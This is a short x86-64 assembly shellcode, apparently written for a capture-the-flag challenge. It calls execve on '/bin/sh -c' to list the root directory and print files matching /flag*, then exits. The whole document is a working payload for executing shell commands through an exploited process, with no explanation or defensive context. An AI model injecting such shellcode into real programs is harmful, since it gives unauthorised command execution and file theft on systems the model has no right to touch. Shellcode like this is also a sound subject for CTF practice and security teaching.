bits 64
global _start
section .text
_start:
  xor eax, eax
  xor edx, edx
  push rdx
  call arg2
  db "/bin/ls /; /bin/cat /flag*", 0
arg2:
  call arg1
  db "-c", 0
arg1:
  call arg0
  db "/bin/sh", 0
arg0:
  pop rdi
  push rdi
  mov rsi, rsp
  mov al, 59
  syscall
  xor edi, edi
  xor eax, eax
  mov al, 60
  syscall
